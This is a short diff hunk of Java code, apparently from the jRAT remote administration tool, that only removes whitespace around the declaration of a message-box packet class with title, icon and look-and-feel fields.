@@ -4,9 +4,8 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet10Messagebox extends AbstractOutgoingPacket {
-	
+
 	private boolean laf;
 	private int icon;
 	private String title;
